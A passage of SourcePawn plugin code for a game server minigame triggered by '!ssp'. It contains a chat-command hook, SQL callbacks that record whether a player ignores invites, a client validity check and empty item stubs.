	g_iGameAmount[client2] = -1;
	g_bInAccept[client2]   = false;
}

public Action:chatHook(int client, int args)
{
	if (!g_bBlockChatCommand)
		return Plugin_Continue;

	char text[256];
	GetCmdArgString(text, sizeof(text));
	StripQuotes(text);

	if (StrContains(text, "!ssp", false) != -1)
		return Plugin_Handled;

	return Plugin_Continue;
}

public void SQLErrorCheckCallback(Handle owner, Handle hndl, const char[] error, any data)
{
	if (!StrEqual(error, ""))
		LogError(error);
}

public void sql_CheckIfSSPBlockedCallback(Handle owner, Handle hndl, const char[] error, any datapack)
{
	int client;
	if (datapack != INVALID_HANDLE)
	{
		ResetPack(datapack);
		client = ReadPackCell(datapack);
		CloseHandle(datapack);
	}

	if (SQL_FetchRow(hndl))
	{
		int result = SQL_FetchInt(hndl, 0);
		if (result != 0)
		{
			g_bIgnoringInvites[client] = true;
		}
	}
}

stock bool isValidClient(int client)
{
	if (!(1 <= client <= MaxClients) || !IsClientInGame(client))
		return false;

	return true;
}

public void AliveItem_OnMapStart() {}

public void AliveItem_Reset() {}

public void AliveItem_Remove(int client, int id) {}

public bool AliveItem_Config(Handle kv, int itemid)
{
	return true;
}

public int AliveItem_Equip(int client, int id)
{
	return -1;
}
